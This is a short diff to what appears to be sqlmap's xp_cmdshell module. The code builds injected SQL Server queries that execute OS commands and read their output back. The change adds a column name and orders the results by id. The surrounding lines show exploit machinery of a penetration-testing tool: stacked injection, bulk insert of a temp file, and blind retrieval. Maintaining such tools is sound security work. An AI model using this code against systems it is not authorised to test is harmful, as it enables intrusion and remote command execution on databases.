@@ -171,7 +171,7 @@ class Xp_cmdshell:
         # retrieve the output when OPENROWSET is used hence the redirection
         # to a temporary file from above
         if insertIntoTable and not conf.dbmsCred:
-            self._forgedCmd += "INSERT INTO %s " % insertIntoTable
+            self._forgedCmd += "INSERT INTO %s(data) " % insertIntoTable
 
         self._forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self._randStr)
 
@@ -205,13 +205,13 @@ class Xp_cmdshell:
                 inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))
                 self.delRemoteFile(self.tmpFile)
 
-            query = "SELECT %s FROM %s" % (self.tblField, self.cmdTblName)
+            query = "SELECT %s FROM %s ORDER BY id" % (self.tblField, self.cmdTblName)
 
             if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
                 output = inject.getValue(query, resumeValue=False, blind=False, time=False)
             else:
                 output = []
-                count = inject.getValue("SELECT COUNT(*) FROM %s" % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
+                count = inject.getValue("SELECT COUNT(id) FROM %s" % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
 
                 if isNumPosStrValue(count):
                     for index in getLimitRange(count):
